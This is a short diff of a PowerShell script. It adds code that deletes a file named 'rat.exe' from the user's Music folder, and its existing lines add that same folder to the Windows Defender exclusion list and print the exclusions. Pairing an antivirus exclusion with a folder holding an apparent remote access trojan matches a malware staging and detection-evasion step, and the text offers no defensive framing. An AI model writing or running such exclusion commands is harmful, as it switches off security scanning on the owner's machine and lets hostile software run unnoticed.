@@ -1,3 +1,19 @@
+
+
+$path = Join-Path $env:USERPROFILE "Music\rat.exe"
+
+if (Test-Path $path) {
+    Remove-Item $path -Force
+    Write-Output "rat.exe deleted."
+} else {
+    Write-Output "File not found."
+}
+
+
+
+
+
+
 Add-MpPreference -ExclusionPath "$env:USERPROFILE\Music"
 Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
 
